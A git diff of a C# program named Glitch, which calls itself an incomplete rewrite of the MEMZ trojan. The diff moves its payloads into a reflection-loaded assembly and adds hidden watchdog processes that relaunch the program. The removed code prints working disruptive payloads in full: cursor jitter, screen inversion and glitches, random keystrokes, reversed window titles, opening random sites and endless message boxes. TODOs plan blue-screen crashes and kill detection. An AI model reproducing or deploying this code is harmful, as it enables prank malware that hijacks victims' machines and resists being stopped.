@@ -1,42 +1,37 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
-using System.Drawing;
-using System.IO;
 using System.Linq;
-using System.Media;
+using System.Reflection;
 using System.Threading;
-using System.Windows.Forms;
 using CC_Functions.W32;
-using ImageProcessor;
-using ScreenLib;
+using GlitchPayloads;
+//#define Watch_Dogs
 
 namespace Glitch
 {
-    internal class Program
+    public class Program
     {
         private static readonly Random Rnd = new Random();
-
+        public static List<MethodInfo>? payloads;
         public static void Main(string[] args)
         {
+#if Watch_Dogs
+            if (args.Length == 1 && args[0] == "wd")
+            {
+                WatchDog.Run();
+                return;
+            }
+#endif
             args = args == null || args.Length == 0
                 ? new[] {""}
                 : args.Select(s => s.ToLower().TrimStart('-', '/', '\\')).ToArray();
-            List<Action> payloads = new Action[]
-            {
-                PayloadCrazyBus,
-                PayloadCursor,
-                PayloadDrawErrors,
-                PayloadDrawWarnings,
-                PayloadExecute,
-                PayloadInvert,
-                PayloadKeyboard,
-                PayloadMessageBox,
-                PayloadReverseText,
-                PayloadScreenGlitches,
-                PayloadSound,
-                PayloadTunnel
-            }.OrderBy(s => s.GetPayloadName()).ToList();
+            payloads = Assembly.GetAssembly(typeof(PayloadAttribute)).GetTypes()
+                .Where(s => s.IsClass &&
+                            s.GetCustomAttributes(false).Any(a => a is PayloadAttribute))
+                .SelectMany(s => s.GetMethods()).Where(s => !s.GetParameters().Any(q => true) && s.GetCustomAttributes(false).Any(a => a is PayloadAttribute))
+                .OrderBy(s => s.GetPayloadName())
+                .ToList();
             switch (args[0])
             {
                 case "list":
@@ -44,8 +39,14 @@ namespace Glitch
                         string.Join(Environment.NewLine, payloads.Select(s => s.GetPayloadName())));
                     break;
                 case "full":
-                    payloads.ForEach(s => new Thread(() => s()).Start());
+                    payloads.ForEach(s => new Thread(() => s.Invoke(null, new object[0])).Start());
+#if !Watch_Dogs
+                    Wnd32.fromHandle(Process.GetCurrentProcess().MainWindowHandle).shown = false;
+                    for (int i = 0; i < WatchDog.WDC; i++)
+                        Process.Start(Process.GetCurrentProcess().MainModule.FileName, "wd");
+#else
                     ShowKill();
+#endif
                     break;
                 case "run":
                     Console.WriteLine("Using payloads:");
@@ -53,15 +54,15 @@ namespace Glitch
                         s =>
                         {
                             Console.WriteLine($"- {s.GetPayloadName()}");
-                            new Thread(() => s()).Start();
+                            new Thread(() => s.Invoke(null, new object[0])).Start();
                         });
                     ShowKill();
                     break;
-                default:
-                    Console.WriteLine("Invalid operator");
+                case "help":
                     ShowHelp();
                     break;
-                case "help":
+                default:
+                    Console.WriteLine("Invalid operator");
                     ShowHelp();
                     break;
             }
@@ -76,235 +77,22 @@ namespace Glitch
 
         private static void ShowHelp()
         {
-            Console.WriteLine(@"CC24 - Glitch - an (incomplete) implementation of Leurak's MEMZ in C#
+            Console.WriteLine(@"CC24 - Glitch - an (incomplete) rewrite of Leurak's MEMZ in C#
 Usage: Glitch <command> [parameters]
+
 Commands:
 -   help: Displays this message
 -   list: Lists all payloads
--   full: Runs all payloads
+-   full: Runs all payloads. This is the only option that includes WatchDogs
 -   run:  Run only the payloads specified in parameters");
-        }
-
-        private static void PayloadCursor()
-        {
-            while (true)
-                try
-                {
-                    Thread.Sleep(200);
-                    Point tmp = Cursor.Position;
-                    tmp.X += Rnd.Next(-2, 4);
-                    tmp.Y += Rnd.Next(-2, 4);
-                    Cursor.Position = tmp;
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.ToString());
-                }
-        }
-
-        private static void PayloadInvert()
-        {
-            while (true)
-                try
-                {
-                    Thread.Sleep(1000);
-                    using MemoryStream ms = new MemoryStream();
-                    using ImageFactory imageFactory = new ImageFactory();
-                    imageFactory.Load(ScreenMan.CaptureScreen())
-                        .InvertColor()
-                        .Save(ms);
-                    ms.Position = 0;
-                    using Drawer drawerBuffered = ScreenMan.GetDrawer();
-                    drawerBuffered.Graphics.DrawImageUnscaled(Image.FromStream(ms), Point.Empty);
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.ToString());
-                }
-        }
-
-        private static void PayloadTunnel()
-        {
-            Rectangle bounds = ScreenMan.GetBounds();
-            Size size34 = new Size((bounds.Width / 4) * 3, (bounds.Height / 4) * 3);
-            Point point34 = new Point(bounds.Width / 8, bounds.Height / 8);
-            while (true)
-                try
-                {
-                    Thread.Sleep(1000);
-                    using MemoryStream ms = new MemoryStream();
-                    using ImageFactory imageFactory = new ImageFactory();
-                    Image tmp = ScreenMan.CaptureScreen();
-                    imageFactory.Load(tmp)
-                        .Resize(size34)
-                        .Save(ms);
-                    ms.Position = 0;
-                    using Drawer drawerBuffered = ScreenMan.GetDrawer(false);
-                    drawerBuffered.Graphics.DrawImageUnscaled(Image.FromStream(ms), point34);
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.ToString());
-                }
-        }
-
-        private static void PayloadReverseText()
-        {
-            while (true)
-                try
-                {
-                    Thread.Sleep(1000);
-                    foreach (Wnd32 wnd in Wnd32.getAll())
-                    {
-                        string? tmp = wnd.title;
-                        if (!string.IsNullOrWhiteSpace(tmp))
-                            wnd.title = string.Join("", tmp.ToCharArray().Reverse());
-                    }
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.ToString());
-                }
-        }
-
-        private static void PayloadKeyboard()
-        {
-            while (true)
-                try
-                {
-                    Thread.Sleep(1000);
-                    SendKeys.SendWait($"{(char) Rnd.Next(48, 123)}");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.ToString());
-                }
-        }
-
-        private static void PayloadSound()
-        {
-            SystemSound[] sounds = typeof(SystemSounds).GetProperties()
-                .Select(s => (SystemSound) s.GetValue(null, null)).ToArray();
-            while (true)
-                try
-                {
-                    Thread.Sleep(1000);
-                    sounds[Rnd.Next(sounds.Length)].Play();
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.ToString());
-                }
-        }
-
-        private static void PayloadExecute()
-        {
-            string[] sites = Sites.SiteString.Split(new[] {"\n", "\r"}, StringSplitOptions.RemoveEmptyEntries);
-            string choice = "";
-            while (true)
-                try
-                {
-                    Thread.Sleep(2000);
-                    choice = sites[Rnd.Next(sites.Length)];
-                    Process.Start(choice);
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine($"{e}\nChoice was: {choice}");
-                }
-        }
-
-        private static void PayloadMessageBox()
-        {
-            while (true)
-                try
-                {
-                    Thread.Sleep(3000);
-                    new Thread(() => MessageBox.Show("Still using this computer?", "lol", MessageBoxButtons.OK,
-                        MessageBoxIcon.Warning)).Start();
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.ToString());
-                }
-        }
-
-        private static void PayloadDrawWarnings()
-        {
-            Rectangle bounds = ScreenMan.GetBounds();
-            Icon icon = SystemIcons.Warning;
-            int xMax = bounds.Width - icon.Width;
-            int yMax = bounds.Height - icon.Height;
-            while (true)
-                try
-                {
-                    Thread.Sleep(1000);
-                    using Drawer drawerBuffered = ScreenMan.GetDrawer(false);
-                    drawerBuffered.Graphics.DrawIcon(icon, Rnd.Next(xMax + 1), Rnd.Next(yMax + 1));
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.ToString());
-                }
-        }
-
-        private static void PayloadDrawErrors()
-        {
-            Icon icon = SystemIcons.Error;
-            Size halfIcon = new Size(icon.Width / 2, icon.Height / 2);
-            while (true)
-                try
-                {
-                    Thread.Sleep(100);
-                    Point tmp = Cursor.Position;
-                    using Drawer drawerBuffered = ScreenMan.GetDrawer(false);
-                    drawerBuffered.Graphics.DrawIcon(icon, tmp.X - halfIcon.Width, tmp.Y - halfIcon.Height);
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.ToString());
-                }
-        }
-
-        private static void PayloadCrazyBus()
-        {
-            while (true)
-                try
-                {
-                    Beep.BeepBeep(1000, Rnd.Next(1000, 6000), 200);
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.ToString());
-                }
-        }
-
-        private static void PayloadScreenGlitches()
-        {
-            Rectangle bounds = ScreenMan.GetBounds();
-            while (true)
-                try
-                {
-                    Thread.Sleep(1000);
-                    Size objSize = new Size(Rnd.Next(100, 500), Rnd.Next(100, 500));
-                    int xMax = bounds.Width - objSize.Width;
-                    int yMax = bounds.Height - objSize.Height;
-                    using MemoryStream ms = new MemoryStream();
-                    using ImageFactory imageFactory = new ImageFactory();
-                    imageFactory.Load(ScreenMan.CaptureScreen())
-                        .Crop(new Rectangle(new Point(Rnd.Next(xMax), Rnd.Next(yMax)), objSize))
-                        .Save(ms);
-                    ms.Position = 0;
-                    using Drawer drawerBuffered = ScreenMan.GetDrawer(false);
-                    drawerBuffered.Graphics.DrawImageUnscaled(Image.FromStream(ms),
-                        new Point(Rnd.Next(xMax), Rnd.Next(yMax)));
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.ToString());
-                }
+#if Watch_Dogs
+            Console.WriteLine("-   wd:   This is used internally and should not be used from outside");
+#endif
         }
     }
 }
-//TODO: Add BSoD functionality
-//TODO: Add kill detection
+
+//TODO: Funciton to build custom payload collections
+//TODO: Forms-builds
+//TODO: Show notepad
+//TODO: Test WD
